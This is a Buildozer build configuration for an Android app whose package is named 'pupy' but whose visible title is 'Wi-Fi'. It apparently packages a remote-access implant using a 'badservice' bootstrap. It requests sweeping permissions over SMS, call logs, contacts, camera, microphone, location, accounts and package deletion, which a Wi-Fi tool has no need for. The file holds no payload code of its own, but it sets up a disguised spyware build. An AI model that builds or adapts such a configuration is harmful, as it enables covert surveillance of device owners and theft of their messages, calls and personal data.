[app]

title = Wi-Fi
package.name = pupy
package.domain = org.pupy
source.dir = .
source.include_exts = py,pyc,pyo,png,jpg,kv,atlas
#source.include_patterns = assets/*,images/*.png
#source.exclude_exts = spec
source.exclude_dirs = python-for-android, bin
#source.exclude_patterns = license,images/*/*.jpg
version = 0.1

requirements = genericndkbuild,pycryptodome,plyer,psutil,tinyec,netaddr,rpyc==3.4.4,dnslib,pyjnius,pyuv,cryptography,kcp,msgpack-python,scandir
#presplash.filename = %(source.dir)s/data/presplash.png
#icon.filename = %(source.dir)s/data/icon.png
orientation = all
fullscreen = 0

android.permissions = INTERNET,READ_EXTERNAL_STORAGE,WRITE_EXTERNAL_STORAGE,VIBRATE,CAMERA,READ_CONTACTS,GET_ACCOUNTS,RECORD_AUDIO,READ_PHONE_STATE,READ_CALL_LOG,WRITE_CALL_LOG,CALL_PHONE,CALL_PRIVILEGED,USE_SIP,PROCESS_OUTGOING_CALLS,ADD_VOICEMAIL,READ_SMS,SEND_SMS,RECEIVE_SMS,RECEIVE_MMS,RECEIVE_WAP_PUSH,CHANGE_CONFIGURATION,CHANGE_NETWORK_STATE,CHANGE_WIFI_MULTICAST_STATE,CHANGE_WIFI_STATE,CLEAR_APP_CACHE,CONTROL_LOCATION_UPDATES,DELETE_PACKAGES,DUMP,FACTORY_TEST,FLASHLIGHT,GLOBAL_SEARCH,KILL_BACKGROUND_PROCESSES,MANAGE_DOCUMENTS,MEDIA_CONTENT_CONTROL,MODIFY_AUDIO_SETTINGS,NFC,ACCESS_COARSE_LOCATION,ACCESS_FINE_LOCATION,ACCESS_LOCATION_EXTRA_COMMANDS,ACCOUNT_MANAGER,BLUETOOTH_ADMIN,BLUETOOTH,BLUETOOTH_PRIVILEGED,ACCESS_NETWORK_STATE

#android.api = 19
#android.minapi = 9
#android.sdk = 20
#android.ndk = 9c
#android.private_storage = True
#android.ndk_path =
#android.sdk_path =
#android.ant_path =

p4a.source_dir = python-for-android
# p4a.local_recipes = python-for-android/pythonforandroid/recipes

#p4a.hook =

android.whitelist = lib-dynload/termios.so,lib-dynload/mmap.so,lib-dynload/_json.so,lib-dynload/pyexpat.so
android.skip_update = True
p4a.bootstrap = badservice

#android.add_src =
#android.add_aars =

#android.add_libs_armeabi = libs/android/*.so
#android.add_libs_armeabi_v7a = libs/android-v7/*.so
#android.add_libs_x86 = libs/android-x86/*.so
#android.add_libs_mips = libs/android-mips/*.so

#android.wakelock = False
#android.meta_data =
#android.library_references =
#android.logcat_filters = *:S python:D
#android.copy_libs = 1

android.arch = armeabi-v7a

[buildozer]
log_level = 1
warn_on_root = 0
build_dir = %BUILDOZER%
# bin_dir = ./bin
